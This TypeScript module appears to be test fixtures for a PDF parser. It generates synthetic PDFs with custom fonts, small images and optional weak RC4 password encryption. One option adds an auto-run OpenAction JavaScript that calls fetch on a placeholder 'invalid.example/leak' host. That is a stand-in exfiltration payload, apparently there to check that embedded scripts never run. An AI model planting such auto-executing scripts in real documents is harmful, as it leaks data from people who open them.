// Original synthetic fixtures; no third-party documents or embedded fonts.
import { createHash } from 'node:crypto'
export interface Line { text: string; x?: number; y?: number }
export interface FixturePage { lines?: Line[]; image?: boolean }
function rc4(key: Buffer, value: Buffer) {
  const s = Array.from({ length: 256 }, (_, i) => i)
  let j = 0
  for (let i = 0; i < 256; i++) { j = (j + s[i] + key[i % key.length]) % 256; [s[i], s[j]] = [s[j], s[i]] }
  let i = 0; j = 0
  return Buffer.from(value.map(byte => { i = (i + 1) % 256; j = (j + s[i]) % 256; [s[i], s[j]] = [s[j], s[i]]; return byte ^ s[(s[i] + s[j]) % 256] }))
}
const md5 = (value: Buffer) => createHash('md5').update(value).digest()
const pad = Buffer.from('28bf4e5e4e758a4164004e56fffa01082e2e00b6d0683e802f0ca9fe6453697a', 'hex')
const padded = (password: string) => Buffer.concat([Buffer.from(password), pad]).subarray(0, 32)

export function makePdf(pages: FixturePage[], options: { password?: boolean; actions?: boolean } = {}) {
  const objects: Buffer[] = []
  const add = (body: string | Buffer) => { objects.push(Buffer.isBuffer(body) ? body : Buffer.from(body, 'ascii')); return objects.length }
  const identifier = Buffer.alloc(16, 7)
  const owner = rc4(md5(padded('owner')).subarray(0, 5), padded('secret'))
  const permissions = Buffer.alloc(4); permissions.writeInt32LE(-4)
  const key = md5(Buffer.concat([padded('secret'), owner, permissions, identifier])).subarray(0, 5)
  const stream = (content: string, extra = '') => {
    let data = Buffer.from(content, 'ascii')
    if (options.password) {
      const suffix = Buffer.alloc(5); suffix.writeUIntLE(objects.length + 1, 0, 3)
      data = rc4(md5(Buffer.concat([key, suffix])).subarray(0, 10), data)
    }
    return add(Buffer.concat([Buffer.from(`<< /Length ${data.length} ${extra} >>\nstream\n`), data, Buffer.from('\nendstream')]))
  }
  add(''); add('') // Catalog and Pages are filled after page allocation.
  const font = add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
  const codes = new Map<string, number>()
  for (const page of pages) for (const line of page.lines ?? []) for (const c of line.text) if (!codes.has(c)) codes.set(c, codes.size + 1)
  const mappings = [...codes].map(([c, code]) => `<${code.toString(16).padStart(4, '0')}> <${Buffer.from(c, 'utf16le').swap16().toString('hex')}>`)
  const cmap = stream(`/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n/CIDSystemInfo << /Registry (Test) /Ordering (Unicode) /Supplement 0 >> def\n/CMapName /Synthetic def\n/CMapType 2 def\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n${mappings.length} beginbfchar\n${mappings.join('\n')}\nendbfchar\nendcmap\nCMapName currentdict /CMap defineresource pop\nend\nend`)
  const descendant = add('<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Synthetic /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /DW 600 >>')
  const unicodeFont = add(`<< /Type /Font /Subtype /Type0 /BaseFont /Synthetic /Encoding /Identity-H /DescendantFonts [${descendant} 0 R] /ToUnicode ${cmap} 0 R >>`)
  const pageRefs: number[] = []
  for (const page of pages) {
    let image = 0
    if (page.image) image = stream('FF0000>', '/Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /ASCIIHexDecode')
    const content = stream((page.image ? 'q 400 0 0 600 40 40 cm /Im0 Do Q\n' : '') + (page.lines ?? []).map((line, i) => {
      const unicode = /[^\x20-\x7E]/u.test(line.text)
      const encoded = unicode ? `<${[...line.text].map(c => codes.get(c)!.toString(16).padStart(4, '0')).join('')}>` : `(${line.text.replace(/[()\\]/gu, '\\$&')})`
      return `BT /${unicode ? 'FU' : 'F1'} 12 Tf 1 0 0 1 ${line.x ?? 40} ${line.y ?? 760 - i * 20} Tm ${encoded} Tj ET`
    }).join('\n'))
    pageRefs.push(add(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 ${font} 0 R /FU ${unicodeFont} 0 R >> ${image ? `/XObject << /Im0 ${image} 0 R >>` : ''} >> /Contents ${content} 0 R >>`))
  }
  let encryption = 0
  if (options.password) encryption = add(`<< /Filter /Standard /V 1 /R 2 /Length 40 /O <${owner.toString('hex')}> /U <${rc4(key, pad).toString('hex')}> /P -4 >>`)
  const action = options.actions ? add(`<< /S /JavaScript /JS <${Buffer.from('globalThis.PDF_SCRIPT_EXECUTED=true;fetch("https://invalid.example/leak")').toString('hex')}> >>`) : 0
  objects[0] = Buffer.from(`<< /Type /Catalog /Pages 2 0 R ${action ? `/OpenAction ${action} 0 R` : ''} >>`)
  objects[1] = Buffer.from(`<< /Type /Pages /Kids [${pageRefs.map(n => `${n} 0 R`).join(' ')}] /Count ${pageRefs.length} >>`)
  const chunks = [Buffer.from('%PDF-1.7\n')], offsets = [0]
  let length = chunks[0].length
  objects.forEach((body, i) => { offsets.push(length); const chunk = Buffer.concat([Buffer.from(`${i + 1} 0 obj\n`), body, Buffer.from('\nendobj\n')]); chunks.push(chunk); length += chunk.length })
  chunks.push(Buffer.from(`xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.slice(1).map(offset => `${String(offset).padStart(10, '0')} 00000 n \n`).join('')}trailer\n<< /Size ${objects.length + 1} /Root 1 0 R ${encryption ? `/Encrypt ${encryption} 0 R /ID [<${identifier.toString('hex')}> <${identifier.toString('hex')}>]` : ''} >>\nstartxref\n${length}\n%%EOF\n`))
  return Buffer.concat(chunks)
}

export const simplePages = [{ lines: [{ text: 'OneWord PDF private sample' }, { text: 'informa-' }, { text: 'tion well-being state-of-the-art x-ray A-B -4' }] }]
